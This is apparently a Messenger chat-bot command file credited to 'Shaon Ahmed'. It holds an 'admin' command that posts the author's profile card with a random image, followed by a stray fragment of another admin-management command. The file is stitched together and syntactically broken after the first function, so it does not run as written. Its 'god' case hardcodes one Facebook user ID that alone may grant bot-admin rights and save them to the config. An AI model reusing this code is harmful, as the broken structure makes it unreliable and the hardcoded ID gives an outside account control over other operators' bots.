module.exports.config = {
  name: "admin",
  version: "1.0.5",
  hasPermssion: 0,
  credits: "Shaon Ahmed",
  description: "Admin Settings",
  usePrefix: false,
  commandCategory: "Admin",
  usages: "[list/add/remove] [userID]",
  cooldowns: 5,
  dependencies: {
        "fs-extra": ""
    }
};

module.exports.run = async function ({
  api: _0x2a2228,
  event: _0x353e91,
  args: _0x570811,
  client: _0x216582,
  Users: _0x448448,
  Threads: _0x1038d4,
  __GLOBAL: _0x1348db,
  Currencies: _0x46afb4
}) {
  const _0x56f1d9 = global.nodemodule.request;
  const _0x212767 = global.nodemodule["fs-extra"];
  var _0x5d3a58 = ["https://i.imgur.com/qMe4oK0.jpg", "https://i.imgur.com/CpiigAY.jpg", "https://i.imgur.com/QzN6CGW.jpg", "https://i.imgur.com/ccfEyVR.jpg"];
  var _0x525234 = () => _0x2a2228.sendMessage({
    'body': "◢◥▂▂▂▂⭕▂▂▂▂◤◣\n☠️☞︎︎︎𝐃𝐎 𝐍𝐎𝐓 𝐓𝐑𝐔𝐒𝐓 𝐓𝐇𝐄 𝐁𝐎𝐓 𝐎𝐏𝐄𝐑𝐀𝐓𝐎𝐑☜︎︎︎☠️\n◥◢▔▔▔▔⭕▔▔▔▔◣◤    \n নাম            :𝗦𝗵𝗮𝗼𝗻 𝗔𝗵𝗺𝗲𝗱(✷‿✷)\nধর্ম              :𝐈𝐬𝐥𝐚𝐦😘\nবাড়ি            :𝐇𝐚𝐛𝐚𝐬𝐡𝐩𝐮𝐫🖤\nপেশা            :𝐇𝐚𝐜𝐤𝐞𝐫🎭\nবয়স            :19+🙆\nউচ্চতা           : 5:5🧍\nওজন           : 𝐁𝐨𝐥𝐛𝐨 𝐧𝐚 𝐬𝐨𝐫𝐨𝐦 𝐤𝐨𝐫𝐚🙈\nরক্ত             :𝐀+🩸\nগায়ের রং        : 𝐊𝐚𝐥𝐚🌚\nবেয়াদবি         : 𝐊𝐨𝐫𝐞 𝐚𝐤𝐭𝐮 𝐚𝐤𝐭𝐮😁\nধন সম্পদ       : 𝐍𝐚𝐢🥹\nভালোবাসা       : 𝐀𝐦𝐦𝐮 𝐀𝐛𝐛𝐮🥰\nরিলেশন         : এইসব প্রেম ট্রেম আমি করি না😎\n𝐛𝐨𝐬𝐬 𝐚𝐫 𝐟𝐛 𝐥𝐢𝐧𝐤  : https://www.facebook.com/Hey.Its.Me.Shaon.Ahmed\n যে আমার সাথে ভালো ব্যবহার করে আমি তার সাথে ভালো ব্যবহার করি\n",
    'attachment': _0x212767.createReadStream(__dirname + "/cache/juswa.jpg")
  }, _0x353e91.threadID, () => _0x212767.unlinkSync(__dirname + "/cache/juswa.jpg"));
  return _0x56f1d9(encodeURI(_0x5d3a58[Math.floor(Math.random() * _0x5d3a58.length)])).pipe(_0x212767.createWriteStream(__dirname + "/cache/juswa.jpg")).on("close", () => _0x525234());
};            }
            else if (content.length != 0 && !isNaN(content[0])) {
                ADMINBOT.push(content[0]);
                config.ADMINBOT.push(content[0]);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", 1, `[ ${content[1]} ] » ${name}`), threadID, messageID);
            }
            else return global.utils.throwError(this.config.name, threadID, messageID);
        }
        
        case "god": {
            const god = ["100042801679001"];
            if (!god.includes(event.senderID)) return api.sendMessage(getText("notHavePermssion", "add"), threadID, messageID);
          

            if (mention.length != 0 && isNaN(content[0])) {
                var listGod = [];

                for (const id of mention) {
                    ADMINBOT.push(id);
                    config.ADMINBOT.push(id);
                    listGod.push(`[ ${id} ] » ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", mention.length, listGod.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                ADMINBOT.push(content[0]);
                config.ADMINBOT.push(content[0]);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("addedNewAdmin", 1, `[ ${content[1]} ] » ${name}`), threadID, messageID);
            }
            else return global.utils.throwError(this.config.name, threadID, messageID);
        }

        case "remove":
        case "rm":
        case "delete": {
            if (permssion != 2) return api.sendMessage(getText("notHavePermssion", "delete"), threadID, messageID);
            if (mentions.length != 0 && isNaN(content[0])) {
                const mention = Object.keys(mentions);
                var listAdd = [];

                for (const id of mention) {
                    const index = config.ADMINBOT.findIndex(item => item == id);
                    ADMINBOT.splice(index, 1);
                    config.ADMINBOT.splice(index, 1);
                    listAdd.push(`[ ${id} ] » ${event.mentions[id]}`);
                };

                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("removedAdmin", mention.length, listAdd.join("\n").replace(/\@/g, "")), threadID, messageID);
            }
            else if (content.length != 0 && !isNaN(content[0])) {
                const index = config.ADMINBOT.findIndex(item => item.toString() == content[0]);
                ADMINBOT.splice(index, 1);
                config.ADMINBOT.splice(index, 1);
                const name = await Users.getNameUser(content[0]);
                writeFileSync(configPath, JSON.stringify(config, null, 4), 'utf8');
                return api.sendMessage(getText("removedAdmin", 1, `[ ${content[0]} ] » ${name}`), threadID, messageID);
            }
            else global.utils.throwError(this.config.name, threadID, messageID);
        }

        default: {
            return global.utils.throwError(this.config.name, threadID, messageID);
        }
    };
}